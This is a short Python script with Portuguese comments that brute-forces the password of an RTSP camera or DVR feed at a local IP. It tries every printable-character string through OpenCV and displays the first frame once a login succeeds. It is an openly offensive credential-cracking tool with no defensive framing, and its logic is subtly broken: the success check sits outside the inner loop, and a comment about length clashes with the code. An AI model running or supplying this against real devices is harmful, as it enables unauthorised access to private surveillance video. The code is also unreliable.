import cv2
import string
from itertools import product

usuario = "admin"
ip = "192.168.1.4"
porta = "554"
caracteres = string.printable
caracteres = caracteres.replace("/", "").replace("#", "").replace("?","").replace("[","").replace("\\","")

# brute force sem saber o tamanho
for tamanho in range(1, 20):  # tenta de 1 até 4 caracteres
    for tentativa in product(caracteres, repeat=tamanho):
        senha = "".join(tentativa)
        url = f"rtsp://{usuario}:{senha}@{ip}:{porta}/"
        print(f"Testando senha: {senha}")
        cap = cv2.VideoCapture(url)
        ret, frame = cap.read()
    if ret:
        print(f"Senha correta encontrada: {senha}")
        cv2.imshow("Camera DVR", frame)
        cv2.waitKey(0)  # mostra o primeiro frame até você apertar uma tecla
        cap.release()
        cv2.destroyAllWindows()
        break

    cap.release()




